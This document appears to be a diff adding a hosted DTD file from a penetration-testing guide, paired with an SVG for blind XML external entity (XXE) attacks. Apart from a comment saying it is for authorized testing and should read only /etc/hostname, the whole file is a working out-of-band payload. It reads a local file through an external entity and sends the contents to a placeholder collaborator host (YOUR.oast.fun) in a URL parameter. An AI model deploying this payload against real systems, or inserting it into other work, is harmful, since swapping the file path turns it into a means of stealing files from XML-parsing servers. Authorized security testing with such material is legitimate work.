@@ -1,0 +1,7 @@
+<!-- Host this at http://YOUR.oast.fun/xxe_oob.dtd  (paired with xxe_oob.svg, guide §14).
+     Authorized testing only. Reads a benign file and beacons it to your collaborator to PROVE
+     blind XXE/file-read. Use /etc/hostname (non-sensitive) for the PoC, not real secrets. -->
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR.oast.fun/leak?d=%file;'>">
+%eval;
+%exfil;
